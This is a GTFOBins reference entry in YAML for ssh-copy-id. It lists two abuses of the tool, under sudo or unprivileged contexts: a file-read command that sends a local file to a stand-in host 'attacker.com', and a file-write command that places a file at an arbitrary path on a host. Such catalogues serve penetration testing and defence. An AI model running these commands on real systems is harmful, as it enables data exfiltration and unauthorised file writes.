<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/ssh-copy-id -->
---
functions:
  file-read:
  - code: |-
      ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com
    comment: |-
      The input file must have the `.pub` file extension. The file will be copied to `~/.ssh/authorized_keys`, otherwise the `-t /path/to/output-file` option can be used.
    contexts:
      sudo:
      unprivileged:
  file-write:
  - code: |-
      ssh-copy-id -f -i /path/to/input-file.pub -t /path/to/output-file user@host
    comment: |-
      The input file must have the `.pub` file extension.
    contexts:
      sudo:
      unprivileged:
...
